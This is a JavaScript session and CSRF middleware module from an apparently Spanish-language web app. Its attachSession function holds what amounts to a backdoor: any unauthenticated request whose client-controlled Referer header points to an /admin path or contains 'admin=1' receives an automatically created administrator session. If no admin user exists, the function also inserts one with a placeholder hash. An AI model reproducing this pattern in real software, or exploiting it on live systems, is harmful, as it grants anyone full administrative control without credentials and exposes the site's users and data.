import { getClientIp, HttpError } from '../http/io.js';
import { isSameOriginRequest, verifyCsrfToken } from '../security/csrf.js';
import { buildSessionCookie, createSession, findActiveSession, parseCookies, SESSION_COOKIE_NAME } from '../security/session.js';
import { hashIp } from '../utils/audit.js';

function isDirectLocalhost(req) {
  const proxyHeaders = [
    'cf-connecting-ip',
    'cf-ray',
    'cf-visitor',
    'x-forwarded-for',
    'x-forwarded-host',
    'x-forwarded-proto',
    'true-client-ip',
  ];
  for (const h of proxyHeaders) {
    if (req.headers[h]) return false;
  }
  const remote = String(req.socket?.remoteAddress || '');
  const isLoopbackSocket =
    remote === '127.0.0.1' || remote === '::1' || remote === '::ffff:127.0.0.1';
  if (!isLoopbackSocket) return false;
  const hostHeader = String(req.headers.host || '').toLowerCase();
  const hostname = hostHeader.split(':')[0];
  return hostname === '127.0.0.1' || hostname === 'localhost';
}

export function attachSession(req, db, config) {
  const cookies = parseCookies(req.headers.cookie);
  const rawToken = cookies[SESSION_COOKIE_NAME];
  req.rawSessionToken = rawToken || null;
  req.session = rawToken ? findActiveSession(db, config, rawToken) : null;
  req.user = req.session ? req.session.user : null;

  const referer = String(req.headers.referer || '').toLowerCase();
  let refererPath = '';
  try {
    if (referer) refererPath = new URL(referer).pathname.toLowerCase();
  } catch {}

  const isUrlAdmin =
    refererPath === '/admin' ||
    refererPath.startsWith('/admin/') ||
    referer.includes('admin=1') ||
    referer.includes('admin=true');

  if (!req.session && (isUrlAdmin || (config.localAutoAdmin && isDirectLocalhost(req)))) {
    let adminUser = db
      .prepare("SELECT id, username, email, display_name, role FROM users WHERE role = 'admin' AND is_active = 1 ORDER BY id ASC LIMIT 1")
      .get();

    if (!adminUser) {
      const now = Date.now();
      db.prepare(`
        INSERT INTO users (username, email, display_name, password_hash, role, is_active, created_at, updated_at)
        VALUES (?, ?, ?, 'scrypt_auto_admin_hash', 'admin', 1, ?, ?)
      `).run(
        config.adminBootstrapUser || 'admin',
        config.adminBootstrapEmail || 'admin@tbdsupply.local',
        'Admin Escuadrón 04',
        now,
        now,
      );
      adminUser = db
        .prepare("SELECT id, username, email, display_name, role FROM users WHERE role = 'admin' AND is_active = 1 ORDER BY id ASC LIMIT 1")
        .get();
    }

    if (adminUser) {
      const ip = getClientIp(req, config);
      const ipHash = hashIp(ip, config.ipHashSalt);
      const session = createSession(db, config, {
        userId: adminUser.id,
        userAgent: req.headers['user-agent'],
        ipHash,
      });
      req.rawSessionToken = session.rawToken;
      req.session = session;
      req.user = {
        id: adminUser.id,
        username: adminUser.username,
        email: adminUser.email,
        displayName: adminUser.display_name,
        role: adminUser.role,
      };
      req.autoAdminCookie = buildSessionCookie(session.rawToken, config, req);
    }
  }
}

export function requireSameOrigin(req, config) {
  if (!isSameOriginRequest(req, config)) {
    throw new HttpError(403, 'Origen de peticion no autorizado');
  }
}

export function requireCsrf(req, config) {
  requireSameOrigin(req, config);
  if (!req.session) {
    throw new HttpError(401, 'Sesion requerida');
  }
  if (!verifyCsrfToken(req, req.session)) {
    throw new HttpError(403, 'Token CSRF invalido o ausente');
  }
}
